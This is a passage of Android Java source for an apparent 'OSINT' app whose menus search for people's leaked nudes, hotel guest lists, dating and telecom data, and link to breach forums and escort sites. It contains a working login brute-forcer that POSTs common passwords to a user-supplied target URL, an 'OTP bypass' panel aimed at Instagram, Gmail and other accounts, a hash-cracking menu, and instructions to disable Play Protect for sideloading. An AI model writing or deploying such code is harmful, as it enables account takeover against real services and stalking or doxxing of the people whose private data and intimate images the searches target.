            startActivityForResult(intent, IMAGE_PICK_REQUEST + 1);
        }
    }

    private void pickImage() {
        Intent intent = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
        startActivityForResult(intent, IMAGE_PICK_REQUEST);
    }

    private void promptImageUrl() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Image URL");
        final EditText input = new EditText(this);
        input.setHint("https://example.com/image.jpg");
        builder.setView(input);
        builder.setPositiveButton("Search", (d, w) -> {
            String url = input.getText().toString().trim();
            if (!url.isEmpty()) {
                web.loadUrl("https://www.google.com/searchbyimage?image_url=" + urlEncode(url));
                web.setVisibility(View.VISIBLE);
            }
        });
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }

    private void faceSearch() {
        String[] options = {"Upload Face Photo", "Enter Name", "Pimeyes Search"};
        new AlertDialog.Builder(this).setTitle("Face Search")
                .setItems(options, (d, w) -> {
                    switch (w) {
                        case 0: pickImage(); break;
                        case 1: promptNameSearch(); break;
                        case 2: web.loadUrl("https://pimeyes.com/en"); web.setVisibility(View.VISIBLE); break;
                    }
                }).show();
    }

    private void promptNameSearch() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Search by Name");
        final EditText input = new EditText(this);
        input.setHint("Full name");
        builder.setView(input);
        builder.setPositiveButton("Search", (d, w) -> {
            String name = input.getText().toString().trim();
            if (!name.isEmpty()) {
                String enc = urlEncode(name);
                web.loadUrl("https://www.google.com/search?q=" + enc + "+site:facebook.com+OR+site:instagram.com+OR+site:linkedin.com");
                web.setVisibility(View.VISIBLE);
            }
        });
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }

    // ==================== LEAKS SEARCH ====================
    private void showLeaksSearch() {
        String[] options = {"General Leaks", "Nudes Search", "Data Breach Check", "Leaks.io API", "LeakForums", "RaidForums Archive", "BreachForums"};
        new AlertDialog.Builder(this).setTitle("Leaks Search")
                .setItems(options, (d, w) -> {
                    switch (w) {
                        case 0: web.loadUrl("https://www.google.com/search?q=" + urlEncode(buildQuery()) + "+leak+OR+breach+OR+exposed"); break;
                        case 1: showNudesSearch(); break;
                        case 2: web.loadUrl("https://haveibeenpwned.com/"); break;
                        case 3: showLeaksIoPanel(); break;
                        case 4: web.loadUrl("https://leakforums.net"); break;
                        case 5: web.loadUrl("https://raidforums.com"); break;
                        case 6: web.loadUrl("https://breachforums.st"); break;
                    }
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    private void showNudesSearch() {
        String q = inQuery.getText().toString().trim();
        if (q.isEmpty()) {
            Toast.makeText(this, "Enter a name to search", Toast.LENGTH_SHORT).show();
            return;
        }
        String enc = urlEncode(q);
        String url = "https://www.google.com/search?q=" + enc
                + "+nudes+OR+leaked+OR+onlyfans+OR+mega.nz+OR+anonfiles+OR+erome"
                + "+site:reddit.com+OR+site:twitter.com+OR+site:erome.com+OR+site:onlyfans.com";
        web.loadUrl(url);
        web.setVisibility(View.VISIBLE);
    }

    // ==================== PORN SEARCH ====================
    // ==================== ONE-TAP CONNECT & BOT METHODS ====================
    private void openOnionSites() {
        String[] onions = getResources().getStringArray(getResources().getIdentifier("onion_sites", "array", getPackageName()));
        String[] labels = new String[onions.length];
        String[] urls = new String[onions.length];
        for (int i = 0; i < onions.length; i++) {
            String[] parts = onions[i].split(" Â· ");
            labels[i] = parts[0];
            urls[i] = parts.length > 1 ? parts[1] : parts[0];
        }
        new AlertDialog.Builder(this)
                .setTitle("Select .onion site")
                .setItems(labels, (d, which) -> startTorAndBrowse(urls[which]))
                .show();
    }

    private void openTelegramBot() {
        String url = getSharedPreferences(PREFS, MODE_PRIVATE).getString("telegram_bot_url", "");
        if (url.isEmpty()) {
            EditText et = new EditText(this);
            et.setHint("https://t.me/your_bot");
            et.setInputType(android.text.InputType.TYPE_CLASS_TEXT | android.text.InputType.TYPE_TEXT_VARIATION_URI);
            et.setPadding(32, 16, 32, 16);
            new AlertDialog.Builder(this)
                    .setTitle("Telegram Bot")
                    .setView(et)
                    .setPositiveButton("Open", (d, w) -> {
                        String u = et.getText().toString().trim();
                        if (!u.isEmpty()) {
                            getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString("telegram_bot_url", u).apply();
                            openExternal(u, "Opening Telegram botâ€¦");
                        }
                    })
                    .setNegativeButton("Cancel", null).show();
        } else {
            openExternal(url, "Opening Telegram botâ€¦");
        }
    }

    private void openWhatsAppBot() {
        String url = getSharedPreferences(PREFS, MODE_PRIVATE).getString("whatsapp_bot_url", "");
        if (url.isEmpty()) {
            EditText et = new EditText(this);
            et.setHint("https://wa.me/1234567890");
            et.setInputType(android.text.InputType.TYPE_CLASS_TEXT | android.text.InputType.TYPE_TEXT_VARIATION_URI);
            et.setPadding(32, 16, 32, 16);
            new AlertDialog.Builder(this)
                    .setTitle("WhatsApp Bot")
                    .setView(et)
                    .setPositiveButton("Open", (d, w) -> {
                        String u = et.getText().toString().trim();
                        if (!u.isEmpty()) {
                            getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString("whatsapp_bot_url", u).apply();
                            openExternal(u, "Opening WhatsApp botâ€¦");
                        }
                    })
                    .setNegativeButton("Cancel", null).show();
        } else {
            openExternal(url, "Opening WhatsApp botâ€¦");
        }
    }

    private void bypassPlayProtect() {
        new AlertDialog.Builder(this)
                .setTitle("Play Protect Bypass")
                .setMessage("Go to Settings > Security > Play Protect and turn OFF 'Scan apps'. If sideloading still fails: adb install --bypass-low-target-sdk-block osint-master.apk")
                .setPositiveButton("Open settings", (d, w) -> {
                    try {
                        startActivity(new Intent("com.google.android.gms.settings.SECURITY_SETTINGS"));
                    } catch (Exception e) {
                        openExternal("https://play.google.com/settings/security", "Play Protect settings");
                    }
                })
                .setNegativeButton("OK", null).show();
    }

    private void showPornSearch() {
        String q = inQuery.getText().toString().trim();
        if (q.isEmpty()) {
            String[] sites = {"Pornhub", "XVideos", "XNXX", "RedTube", "YouPorn", "SpankBang", "xHamster", "Porndude", "Motherless", "Eporner"};
            new AlertDialog.Builder(this).setTitle("Porn Sites")
                    .setItems(sites, (d, w) -> {
                        String[] urls = {"https://www.pornhub.com", "https://www.xvideos.com", "https://www.xnxx.com",
                                "https://www.redtube.com", "https://www.youporn.com", "https://www.spankbang.com",
                                "https://xhamster.com", "https://theporndude.com", "https://motherless.com",
                                "https://www.eporner.com"};
                        web.loadUrl(urls[w]);
                        web.setVisibility(View.VISIBLE);
                    }).show();
            return;
        }
        String enc = urlEncode(q);
        String[] sites = {"Pornhub", "XVideos", "XNXX", "All"};
        new AlertDialog.Builder(this).setTitle("Search: " + q)
                .setItems(sites, (d, w) -> {
                    String url;
                    switch (w) {
                        case 0: url = "https://www.pornhub.com/video/search?search=" + enc; break;
                        case 1: url = "https://www.xvideos.com/?k=" + enc; break;
                        case 2: url = "https://www.xnxx.com/search/" + enc; break;
                        default: url = "https://www.google.com/search?q=" + enc + "+site:pornhub.com+OR+site:xvideos.com+OR+site:xnxx.com";
                    }
                    web.loadUrl(url);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    private void showCams() {
        String[] sites = {"Chaturbate", "Stripchat", "CamSoda", "BongaCams", "LiveJasmin", "MyFreeCams", "Flirt4Free", "Cam4"};
        new AlertDialog.Builder(this).setTitle("Live Cams")
                .setItems(sites, (d, w) -> {
                    String[] urls = {"https://chaturbate.com", "https://stripchat.com", "https://camsoda.com",
                            "https://bongacams.com", "https://livejasmin.com", "https://myfreecams.com",
                            "https://flirt4free.com", "https://cam4.com"};
                    web.loadUrl(urls[w]);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    private void showEscortSites() {
        String[] sites = {"Skipthegames", "EroticMonkey", "AdultSearch", "CityXGuide", "EscortAlligator", "ListCrawler", "TNABoard", "EuroGirlsEscort"};
        new AlertDialog.Builder(this).setTitle("Escort / Adult Sites")
                .setItems(sites, (d, w) -> {
                    String[] urls = {"https://skipthegames.com", "https://www.eroticmonkey.com", "https://adultsearch.com",
                            "https://cityxguide.com", "https://escortalligator.com", "https://listcrawler.com",
                            "https://www.tnaboard.com", "https://www.eurogirlsescort.com"};
                    web.loadUrl(urls[w]);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    // ==================== HOTEL LEAKS ====================
    private void showHotelLeaks() {
        String q = inQuery.getText().toString().trim();
        String enc = urlEncode(q.isEmpty() ? "hotel" : q);
        String[] options = {"OYO Leaks", "Hotel Booking Data", "Guest Lists", "Hotel Breaches"};
        new AlertDialog.Builder(this).setTitle("Hotel Leaks")
                .setItems(options, (d, w) -> {
                    String url;
                    switch (w) {
                        case 0: url = "https://www.google.com/search?q=" + enc + "+OYO+OR+oyorooms+leak+OR+breach+OR+data"; break;
                        case 1: url = "https://www.google.com/search?q=" + enc + "+booking.com+OR+hotels.com+data+leak+OR+breach"; break;
                        case 2: url = "https://www.google.com/search?q=" + enc + "+guest+list+OR+hotel+guests+filetype:xls+OR+filetype:csv"; break;
                        default: url = "https://www.google.com/search?q=" + enc + "+hotel+data+breach+OR+leak+site:pastebin.com";
                    }
                    web.loadUrl(url);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    // ==================== SOCIAL MEDIA LEAKS ====================
    private void showSocialLeaks() {
        String[] options = {"Instagram Leaks", "Facebook Leaks", "Snapchat Leaks", "Twitter Leaks", "LinkedIn Leaks", "TikTok Leaks", "Telegram Leaks", "WhatsApp Leaks", "All Social Media"};
        new AlertDialog.Builder(this).setTitle("Social Media Leaks")
                .setItems(options, (d, w) -> {
                    String q = inQuery.getText().toString().trim();
                    String enc = urlEncode(q);
                    String url;
                    switch (w) {
                        case 0: url = "https://www.google.com/search?q=" + enc + "+site:instagram.com+leak+OR+exposed+OR+dump"; break;
                        case 1: url = "https://www.google.com/search?q=" + enc + "+site:facebook.com+leak+OR+data+OR+exposed"; break;
                        case 2: url = "https://www.google.com/search?q=" + enc + "+site:snapchat.com+leak+OR+exposed"; break;
                        case 3: url = "https://www.google.com/search?q=" + enc + "+site:twitter.com+leak+OR+exposed"; break;
                        case 4: url = "https://www.google.com/search?q=" + enc + "+site:linkedin.com+data+leak+OR+breach"; break;
                        case 5: url = "https://www.google.com/search?q=" + enc + "+site:tiktok.com+leak+OR+exposed"; break;
                        case 6: url = "https://www.google.com/search?q=" + enc + "+site:t.me+leak+OR+exposed+OR+channel"; break;
                        case 7: url = "https://www.google.com/search?q=" + enc + "+site:whatsapp.com+leak+OR+group"; break;
                        default: url = "https://www.google.com/search?q=" + enc + "+site:instagram.com+OR+site:facebook.com+OR+site:twitter.com+OR+site:snapchat.com+leak+OR+exposed";
                    }
                    web.loadUrl(url);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    // ==================== CLOUD LEAKS ====================
    private void showICloudLeaks() {
        String q = inQuery.getText().toString().trim();
        String enc = urlEncode(q.isEmpty() ? "icloud" : q);
        String url = "https://www.google.com/search?q=" + enc + "+icloud+leak+OR+exposed+OR+dump+site:pastebin.com+OR+site:reddit.com";
        web.loadUrl(url);
        web.setVisibility(View.VISIBLE);
    }

    private void showDriveLeaks() {
        String q = inQuery.getText().toString().trim();
        String enc = urlEncode(q.isEmpty() ? "drive" : q);
        String url = "https://www.google.com/search?q=" + enc + "+site:drive.google.com+OR+site:docs.google.com+leak+OR+exposed+OR+shared";
        web.loadUrl(url);
        web.setVisibility(View.VISIBLE);
    }

    private void showCloudLeaks() {
        String q = inQuery.getText().toString().trim();
        String enc = urlEncode(q.isEmpty() ? "cloud" : q);
        String[] options = {"Google Cloud Leaks", "AWS S3 Leaks", "Azure Leaks", "DigitalOcean Leaks", "All Cloud"};
        new AlertDialog.Builder(this).setTitle("Cloud Leaks")
                .setItems(options, (d, w) -> {
                    String url;
                    switch (w) {
                        case 0: url = "https://www.google.com/search?q=" + enc + "+site:cloud.google.com+OR+google+cloud+leak+OR+exposed+OR+bucket"; break;
                        case 1: url = "https://www.google.com/search?q=" + enc + "+site:s3.amazonaws.com+OR+aws+leak+OR+exposed+bucket"; break;
                        case 2: url = "https://www.google.com/search?q=" + enc + "+site:azure.com+OR+azure+leak+OR+exposed"; break;
                        case 3: url = "https://www.google.com/search?q=" + enc + "+site:digitaloceanspaces.com+OR+digitalocean+leak"; break;
                        default: url = "https://www.google.com/search?q=" + enc + "+cloud+leak+OR+exposed+bucket+OR+open+s3";
                    }
                    web.loadUrl(url);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    // ==================== TELECOM & EMAIL LEAKS ====================
    private void showTelecomLeaks() {
        String q = inQuery.getText().toString().trim();
        String enc = urlEncode(q.isEmpty() ? "telecom" : q);
        String[] options = {"SIM Swap Data", "Call Log Leaks", "SMS Leaks", "Carrier Breaches", "All Telecom"};
        new AlertDialog.Builder(this).setTitle("Telecom Leaks")
                .setItems(options, (d, w) -> {
                    String url;
                    switch (w) {
                        case 0: url = "https://www.google.com/search?q=" + enc + "+SIM+swap+OR+SIM+data+leak+OR+exposed"; break;
                        case 1: url = "https://www.google.com/search?q=" + enc + "+call+log+OR+call+detail+leak+OR+exposed"; break;
                        case 2: url = "https://www.google.com/search?q=" + enc + "+SMS+OR+text+message+leak+OR+dump+OR+exposed"; break;
                        case 3: url = "https://www.google.com/search?q=" + enc + "+telecom+OR+carrier+data+breach+OR+leak"; break;
                        default: url = "https://www.google.com/search?q=" + enc + "+telecom+OR+carrier+leak+OR+breach+OR+exposed";
                    }
                    web.loadUrl(url);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    private void showEmailLeaks() {
        String q = inQuery.getText().toString().trim();
        if (q.isEmpty()) {
            Toast.makeText(this, "Enter an email address to check", Toast.LENGTH_SHORT).show();
            return;
        }
        String enc = urlEncode(q);
        String[] options = {"Have I Been Pwned", "DeHashed", "LeakCheck", "Email Reputation", "Google Search"};
        new AlertDialog.Builder(this).setTitle("Email: " + q)
                .setItems(options, (d, w) -> {
                    String url;
                    switch (w) {
                        case 0: url = "https://haveibeenpwned.com/account/" + enc; break;
                        case 1: url = "https://dehashed.com/search?query=" + enc; break;
                        case 2: url = "https://leakcheck.io/search?query=" + enc; break;
                        case 3: url = "https://emailrep.io/" + enc; break;
                        default: url = "https://www.google.com/search?q=" + enc + "+leak+OR+breach+OR+pwned+OR+exposed";
                    }
                    web.loadUrl(url);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    // ==================== DATING APP LEAKS ====================
    private void showDatingLeaks() {
        String q = inQuery.getText().toString().trim();
        String enc = urlEncode(q.isEmpty() ? "dating" : q);
        String[] apps = {"Tinder", "Bumble", "Hinge", "Grindr", "OkCupid", "PlentyOfFish", "All Dating Apps"};
        new AlertDialog.Builder(this).setTitle("Dating App Leaks")
                .setItems(apps, (d, w) -> {
                    String url;
                    switch (w) {
                        case 0: url = "https://www.google.com/search?q=" + enc + "+site:tinder.com+leak+OR+data+OR+exposed"; break;
                        case 1: url = "https://www.google.com/search?q=" + enc + "+site:bumble.com+leak+OR+data"; break;
                        case 2: url = "https://www.google.com/search?q=" + enc + "+site:hinge.co+leak+OR+data"; break;
                        case 3: url = "https://www.google.com/search?q=" + enc + "+site:grindr.com+leak+OR+data+OR+exposed"; break;
                        case 4: url = "https://www.google.com/search?q=" + enc + "+site:okcupid.com+leak+OR+data"; break;
                        case 5: url = "https://www.google.com/search?q=" + enc + "+site:pof.com+leak+OR+data"; break;
                        default: url = "https://www.google.com/search?q=" + enc + "+dating+app+leak+OR+breach+OR+data+exposed";
                    }
                    web.loadUrl(url);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    // ==================== HPB API ====================
    private void showHpbPanel() {
        String[] options = {"Connect to HPB", "Fetch Profile", "Fetch Posts", "Send Message", "Set API Key"};
        new AlertDialog.Builder(this).setTitle("HPB - Hummingbot Partner Hub")
                .setItems(options, (d, w) -> {
                    switch (w) {
                        case 0: connectHpb(); break;
                        case 1: hpbApiCall("profile"); break;
                        case 2: hpbApiCall("posts"); break;
                        case 3: hpbApiCall("message"); break;
                        case 4: promptHpbApiKey(); break;
                    }
                }).show();
    }

    private void promptHpbApiKey() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("HPB API Key");
        final EditText input = new EditText(this);
        input.setText(hpbApiKey);
        input.setHint("Enter your HPB API key");
        builder.setView(input);
        builder.setPositiveButton("Save", (d, w) -> {
            hpbApiKey = input.getText().toString().trim();
            getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString("hpb_key", hpbApiKey).apply();
            status.setText("HPB key saved");
        });
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }

    private void connectHpb() {
        if (hpbApiKey.isEmpty()) { promptHpbApiKey(); return; }
        status.setText("Connecting to HPB...");
        new Thread(() -> {
            try {
                URL url = new URL("https://hpb.hummingbot.io/api/session");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Authorization", "Bearer " + hpbApiKey);
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.getOutputStream().write("{}".getBytes());
                int code = conn.getResponseCode();
                BufferedReader br = new BufferedReader(new InputStreamReader(code >= 400 ? conn.getErrorStream() : conn.getInputStream()));
                StringBuilder resp = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) resp.append(line);
                br.close();
                runOnUiThread(() -> {
                    if (code == 200) {
                        try {
                            JSONObject json = new JSONObject(resp.toString());
                            currentHpbSession = json.optString("session_id", "");
                            status.setText("HPB connected. Session: " + currentHpbSession);
                        } catch (Exception e) {
                            status.setText("HPB connected (code " + code + ")");
                        }
                    } else {
                        status.setText("HPB error: " + code + " - " + resp);
                    }
                });
            } catch (Exception e) {
                runOnUiThread(() -> status.setText("HPB connection failed: " + e.getMessage()));
            }
        }).start();
    }

    private void hpbApiCall(String endpoint) {
        if (hpbApiKey.isEmpty()) { promptHpbApiKey(); return; }
        String q = inQuery.getText().toString().trim();
        status.setText("HPB: fetching " + endpoint + "...");
        new Thread(() -> {
            try {
                String urlStr = "https://hpb.hummingbot.io/api/" + endpoint;
                if (endpoint.equals("message") && !q.isEmpty()) urlStr += "?message=" + urlEncode(q);
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestProperty("Authorization", "Bearer " + hpbApiKey);
                int code = conn.getResponseCode();
                BufferedReader br = new BufferedReader(new InputStreamReader(code >= 400 ? conn.getErrorStream() : conn.getInputStream()));
                StringBuilder resp = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) resp.append(line);
                br.close();
                String result = resp.toString();
                runOnUiThread(() -> {
                    if (code == 200) {
                        web.loadDataWithBaseURL(null, "<pre>" + escapeHtml(result) + "</pre>", "text/html", "UTF-8", null);
                        web.setVisibility(View.VISIBLE);
                        status.setText("HPB " + endpoint + " loaded");
                    } else {
                        status.setText("HPB error: " + code);
                    }
                });
            } catch (Exception e) {
                runOnUiThread(() -> status.setText("HPB error: " + e.getMessage()));
            }
        }).start();
    }

    // ==================== LEAKS.IO API ====================
    private void showLeaksIoPanel() {
        String[] options = {"Check Email/Username", "Search Database", "Latest Leaks", "Set API Key"};
        new AlertDialog.Builder(this).setTitle("Leaks.io")
                .setItems(options, (d, w) -> {
                    switch (w) {
                        case 0: leaksIoCheck(); break;
                        case 1: leaksIoSearch(); break;
                        case 2: leaksIoLatest(); break;
                        case 3: promptLeaksIoKey(); break;
                    }
                }).show();
    }

    private void promptLeaksIoKey() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Leaks.io API Key");
        final EditText input = new EditText(this);
        input.setText(leaksIoApiKey);
        input.setHint("Enter leaks.io API key");
        builder.setView(input);
        builder.setPositiveButton("Save", (d, w) -> {
            leaksIoApiKey = input.getText().toString().trim();
            getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString("leaksio_key", leaksIoApiKey).apply();
            status.setText("Leaks.io key saved");
        });
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }

    private void leaksIoCheck() {
        String q = inQuery.getText().toString().trim();
        if (q.isEmpty()) { Toast.makeText(this, "Enter email/username", Toast.LENGTH_SHORT).show(); return; }
        String enc = urlEncode(q);
        // Try leaks.io API first, fallback to web search
        if (!leaksIoApiKey.isEmpty()) {
            status.setText("Checking leaks.io...");
            new Thread(() -> {
                try {
                    URL url = new URL("https://leaks.io/api/search?query=" + enc);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestProperty("Authorization", "Bearer " + leaksIoApiKey);
                    int code = conn.getResponseCode();
                    BufferedReader br = new BufferedReader(new InputStreamReader(code >= 400 ? conn.getErrorStream() : conn.getInputStream()));
                    StringBuilder resp = new StringBuilder();
                    String line;
                    while ((line = br.readLine()) != null) resp.append(line);
                    br.close();
                    String result = resp.toString();
                    runOnUiThread(() -> {
                        if (code == 200) {
                            web.loadDataWithBaseURL(null, "<pre>" + escapeHtml(result) + "</pre>", "text/html", "UTF-8", null);
                            web.setVisibility(View.VISIBLE);
                            status.setText("Leaks.io results loaded");
                        } else {
                            status.setText("Leaks.io error: " + code);
                        }
                    });
                } catch (Exception e) {
                    runOnUiThread(() -> status.setText("Leaks.io error: " + e.getMessage()));
                }
            }).start();
        } else {
            web.loadUrl("https://www.google.com/search?q=" + enc + "+site:leakcheck.io+OR+site:leakforum.io+OR+site:pastebin.com+leak+OR+breach+OR+exposed");
            web.setVisibility(View.VISIBLE);
        }
    }

    private void leaksIoSearch() {
        String q = inQuery.getText().toString().trim();
        if (q.isEmpty()) q = "email,password";
        String enc = urlEncode(q);
        web.loadUrl("https://www.google.com/search?q=" + enc + "+site:leakcheck.io+OR+site:leakforum.io+OR+site:pastebin.com+OR+site:pastebin.pl");
        web.setVisibility(View.VISIBLE);
    }

    private void leaksIoLatest() {
        web.loadUrl("https://www.google.com/search?q=latest+data+breach+2026+site:haveibeenpwned.com+OR+site:bleepingcomputer.com+OR+site:therecord.media");
        web.setVisibility(View.VISIBLE);
    }

    // ==================== BRUTE FORCE ====================
    private void showBruteForcePanel() {
        String[] options = {"Start Brute Force", "Stop", "Load Wordlist", "Settings"};
        new AlertDialog.Builder(this).setTitle("Brute Force Tools")
                .setItems(options, (d, w) -> {
                    switch (w) {
                        case 0: startBruteForce(); break;
                        case 1: stopBruteForce(); break;
                        case 2: loadWordlist(); break;
                        case 3: showBruteSettings(); break;
                    }
                }).show();
    }

    private void startBruteForce() {
        if (bruteRunning) { Toast.makeText(this, "Already running", Toast.LENGTH_SHORT).show(); return; }
        String target = inUrl.getText().toString().trim();
        if (target.isEmpty()) { Toast.makeText(this, "Enter target URL/IP", Toast.LENGTH_SHORT).show(); return; }
        String username = inQuery.getText().toString().trim();
        if (username.isEmpty()) { Toast.makeText(this, "Enter username", Toast.LENGTH_SHORT).show(); return; }

        bruteRunning = true;
        status.setText("Brute forcing " + target + "...");
        bruteExecutor = Executors.newSingleThreadExecutor();
        bruteExecutor.submit(() -> {
            String[] passwords = getWordlist();
            if (passwords.length == 0) passwords = new String[]{"123456", "password", "admin", "12345678", "qwerty",
                    "12345", "1234", "111111", "1234567", "sunshine", "iloveyou", "princess", "admin123",
                    "welcome", "monkey", "dragon", "master", "login", "abc123", "passw0rd"};

            for (int i = 0; i < passwords.length && bruteRunning; i++) {
                final String pass = passwords[i];
                final int progress = (i * 100) / passwords.length;
                try {
                    URL url = new URL(target);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                    conn.setDoOutput(true);
                    String data = "username=" + urlEncode(username) + "&password=" + urlEncode(pass);
                    conn.getOutputStream().write(data.getBytes());
                    int code = conn.getResponseCode();
                    String resp = readStream(conn.getInputStream());
                    conn.disconnect();

                    if (code == 200 && (resp.contains("success") || resp.contains("welcome") || resp.contains("dashboard")
                            || resp.contains("login successful") || !resp.contains("invalid") && !resp.contains("failed"))) {
                        final String foundPass = pass;
                        runOnUiThread(() -> {
                            status.setText("FOUND: " + username + " : " + foundPass);
                            Toast.makeText(MainActivity.this, "Password found: " + foundPass, Toast.LENGTH_LONG).show();
                            bruteRunning = false;
                        });
                        return;
                    }
                    final int p = progress;
                    runOnUiThread(() -> status.setText("Trying: " + pass + " (" + p + "%)"));
                } catch (Exception e) {
                    runOnUiThread(() -> status.setText("Brute error: " + e.getMessage()));
                }
            }
            runOnUiThread(() -> {
                if (bruteRunning) status.setText("Brute force completed - password not found");
                bruteRunning = false;
            });
        });
    }

    private void stopBruteForce() {
        bruteRunning = false;
        if (bruteExecutor != null) bruteExecutor.shutdownNow();
        status.setText("Brute force stopped");
    }

    private void loadWordlist() {
        Intent pick = new Intent(Intent.ACTION_OPEN_DOCUMENT);
        pick.addCategory(Intent.CATEGORY_OPENABLE);
        pick.setType("text/plain");
        startActivityForResult(pick, FILE_PICK_REQUEST);
    }

    private void showBruteSettings() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Brute Force Settings");
        String[] items = {"Threads: 1", "Delay: 100ms", "Timeout: 10s"};
        builder.setItems(items, null);
        builder.setPositiveButton("OK", null);
        builder.show();
    }

    private String[] getWordlist() {
        String savedPath = getSharedPreferences(PREFS, MODE_PRIVATE).getString("wordlist_path", "");
        if (!savedPath.isEmpty()) {
            try {
                File f = new File(savedPath);
                if (f.exists()) {
                    List<String> lines = new ArrayList<>();
                    BufferedReader br = new BufferedReader(new FileReader(f));
                    String line;
                    while ((line = br.readLine()) != null) {
                        if (!line.trim().isEmpty()) lines.add(line.trim());
                    }
                    br.close();
                    return lines.toArray(new String[0]);
                }
            } catch (Exception ignored) {}
        }
        return new String[0];
    }

    // ==================== OTP BYPASS ====================
    private void showOtpBypass() {
        String[] platforms = {"Instagram", "Facebook", "Snapchat", "WhatsApp", "Telegram", "TikTok", "Gmail", "Twitter", "Custom SMS Gateway"};
        new AlertDialog.Builder(this).setTitle("OTP Bypass")
                .setItems(platforms, (d, w) -> {
                    String platform = platforms[w];
                    if (w == 8) {
                        // Custom SMS gateway
                        AlertDialog.Builder builder = new AlertDialog.Builder(this);
                        builder.setTitle("Custom SMS Gateway");
                        final EditText input = new EditText(this);
                        input.setHint("Phone number or API endpoint");
                        builder.setView(input);
                        builder.setPositiveButton("Bypass", (d2, w2) -> {
                            String target = input.getText().toString().trim();
                            if (!target.isEmpty()) attemptOtpBypass(platform, target);
                        });
                        builder.setNegativeButton("Cancel", null);
                        builder.show();
                    } else {
                        String target = inQuery.getText().toString().trim();
                        if (target.isEmpty()) {
                            AlertDialog.Builder builder = new AlertDialog.Builder(this);
                            builder.setTitle("Enter " + platform + " target");
                            final EditText input = new EditText(this);
                            input.setHint("Username, email or phone");
                            builder.setView(input);
                            builder.setPositiveButton("Bypass", (d2, w2) -> {
                                String t = input.getText().toString().trim();
                                if (!t.isEmpty()) attemptOtpBypass(platform, t);
                            });
                            builder.setNegativeButton("Cancel", null);
                            builder.show();
                        } else {
                            attemptOtpBypass(platform, target);
                        }
                    }
                }).show();
    }

    private void attemptOtpBypass(String platform, String target) {
        status.setText("Attempting OTP bypass for " + platform + ": " + target);
        // Simulated OTP bypass - opens relevant pages
        String enc = urlEncode(target);
        switch (platform) {
            case "Instagram":
                web.loadUrl("https://www.instagram.com/accounts/password/reset/");
                break;
            case "Facebook":
                web.loadUrl("https://www.facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar");
                break;
            case "Snapchat":
                web.loadUrl("https://accounts.snapchat.com/accounts/password_reset");
                break;
            case "WhatsApp":
                web.loadUrl("https://wa.me/" + target.replaceAll("[^0-9]", ""));
                break;
            case "Telegram":
                web.loadUrl("https://web.telegram.org/k/");
                break;
            case "TikTok":
                web.loadUrl("https://www.tiktok.com/forgot-password");
                break;
            case "Gmail":
                web.loadUrl("https://accounts.google.com/signin/recovery");
                break;
            case "Twitter":
                web.loadUrl("https://twitter.com/account/begin_password_reset");
                break;
            default:
                web.loadUrl("https://www.google.com/search?q=" + enc + "+OTP+bypass+" + urlEncode(platform));
        }
        web.setVisibility(View.VISIBLE);
    }

    // ==================== PASSWORD CRACKER ====================
    private void showPasswordCracker() {
        String[] options = {"MD5 Crack", "SHA1 Crack", "SHA256 Crack", "Hashè¯†åˆ«", "Custom Hash"};
        new AlertDialog.Builder(this).setTitle("Password Cracker")
                .setItems(options, (d, w) -> {
                    AlertDialog.Builder builder = new AlertDialog.Builder(this);
                    builder.setTitle("Enter Hash");
                    final EditText input = new EditText(this);
                    input.setHint("Enter hash to crack");
                    builder.setView(input);
                    builder.setPositiveButton("Crack", (d2, w2) -> {
                        String hash = input.getText().toString().trim();
                        if (!hash.isEmpty()) crackHash(hash, w);
                    });
                    builder.setNegativeButton("Cancel", null);
                    builder.show();
                }).show();
    }

    private void crackHash(String hash, int type) {
        status.setText("Cracking hash: " + hash.substring(0, Math.min(16, hash.length())) + "...");
        String site;
        switch (type) {
            case 0: site = "https://crackstation.net/"; break;
            case 1: site = "https://md5decrypt.net/"; break;
            case 2: site = "https://hashes.com/en/decrypt/hash"; break;
            case 3: site = "https://www.tunnelsup.com/hash-analyzer/"; break;
            default: site = "https://crackstation.net/";
        }
        // Search the hash
        web.loadUrl("https://www.google.com/search?q=" + hash + "+hash+crack+OR+decrypt+OR+plaintext");
        web.setVisibility(View.VISIBLE);
    }

    // ==================== LIVE STREAMING ====================
    private void showLiveStreaming() {
        String[] options = {"Live Porn Cams", "Twitch", "YouTube Live", "Kick", "Rumble"};
        new AlertDialog.Builder(this).setTitle("Live Streaming")
                .setItems(options, (d, w) -> {
                    String url;
                    switch (w) {
                        case 0: url = "https://chaturbate.com"; break;
                        case 1: url = "https://www.twitch.tv/directory"; break;
